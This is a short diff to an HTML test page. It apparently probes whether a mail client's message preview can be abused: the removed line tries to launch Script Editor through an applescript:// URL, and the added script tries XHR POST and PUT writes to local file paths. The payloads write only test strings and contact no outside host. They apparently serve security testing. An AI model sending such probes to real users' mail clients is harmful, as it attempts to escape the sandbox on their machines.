@@ -2,8 +2,16 @@
 <html>
 <body>
 <script>
-window.location.href = 'data:text/html,<script>window.open("applescript://com.apple.scripteditor?action=new&script=display%20dialog%20%5C%22Data%20URI%20Test%5C%22")</script>';
+// Try XHR to write to local files
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'file:///Users/Shared/xhr_write.txt', true);
+xhr.send('XHR data from Mail preview');
+
+// Try PUT method
+const xhr2 = new XMLHttpRequest();
+xhr2.open('PUT', 'file:///tmp/put_write.txt', true);
+xhr2.send('PUT data from Mail');
 </script>
-<p>Loading data script...</p>
+<p>Sending data...</p>
 </body>
 </html>
